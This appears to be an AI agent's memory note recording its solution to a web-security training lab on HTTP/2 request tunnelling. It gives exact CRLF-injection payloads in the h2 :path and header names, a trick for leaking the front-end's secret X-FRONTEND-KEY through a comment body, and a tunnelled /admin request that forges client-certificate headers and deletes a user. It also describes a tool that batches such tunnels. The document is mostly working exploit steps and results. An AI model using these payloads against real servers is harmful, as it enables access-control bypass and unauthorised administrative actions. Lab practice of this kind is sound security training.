---
metadata:
  node_type: memory
name: "PRS lab solve h2-bypass-access-controls-via-request-tunnelling"
description: "H2 request-tunnelling ACL lab solved: the front-end appends a secret X-FRONTEND-KEY header; leak it via the POST /post/comment body trick, then tunnel /admin with X-FRONTEND-KEY + forged X-SSL-VERIFIED/X-SSL-CLIENT-CN and a decoy request absorbing the front-end's own headers"
last_updated: 2026-10-12T08:10:45+08:00
created: 2026-10-12T08:10:45+08:00
---

## Chain (solved, banner is-solved)
lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling; instance 0a2500f60496284181a91bc9005600e9.web-security-academy.net (jar /tmp/cj1.json, reused:false).

Front-end injection surface: CRLF in the h2 `:path` (works; `:path` must stay space-free enough for the outer line). A header NAME with CRLF also works, but the injected first line needs a colon (e.g. name `x: y\r\n\r\nGET /admin HTTP/1.1\r\nHost: H\r\nZ`) or the back-end 400s. CRLF in a header VALUE is rejected (RST_STREAM); bare CR in a name 400s.

Downgrade order (leaked): request line `{method} {path} HTTP/1.1`, then `Host: <authority>`, then the client headers, then the front-end's appended block, then a blank.

Front-end appended block: `Host: <host>`, `X-SSL-VERIFIED: 0`, `X-SSL-CLIENT-CN: null`, `X-FRONTEND-KEY: 8493884077031076`, `Content-Length: <n>`. X-FRONTEND-KEY is the app's front-end secret - the ACL predicate component that the earlier (truncated) leaks missed.

Leak recipe: POST /post/comment with :path = `/post/comment HTTP/1.1\r\nHost: H\r\nCookie: session=<s>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: L\r\n\r\ncsrf=<c>&postId=1&name=a&email=a@a.a&website=&comment=` - the front-end's appended headers become the `comment` param value; read them at GET /post?postId=1. L must be <= total body (bisect: 220 worked, 280 deadlocked).

Bypass: tunnel /admin carrying `X-FRONTEND-KEY: <key>` + `X-SSL-VERIFIED: 1` + `X-SSL-CLIENT-CN: administrator`, plus a trailing decoy request (header block left open) that soaks up the front-end's appended headers:
:path = `/admin HTTP/1.1\r\nHost: H\r\nX-FRONTEND-KEY: <key>\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\n\r\nGET /x HTTP/1.1\r\nHost: H\r\nX-Decoy: 1`
-> 200 admin panel (3293 B, users wiener+carlos). Same with `/admin/delete?username=carlos` -> 302 Location: /admin; banner is-solved.

Predicate: X-FRONTEND-KEY alone -> 401; X-SSL-VERIFIED:1+X-SSL-CLIENT-CN:administrator alone -> 401; the combo -> 200. Alternative isolation: put `Content-Length: 116` (= the appended block + blank + the front-end's line-tail) on the /admin request to swallow the block into the body.

Tooling: new project piece h2acl_sweep batches decoy tunnels (--builtin battery / --line / --file). Single-shot h2_req also works; the HEAD-over-read channel (outer HEAD on a small-CL path) reads the tunnelled response bytes.

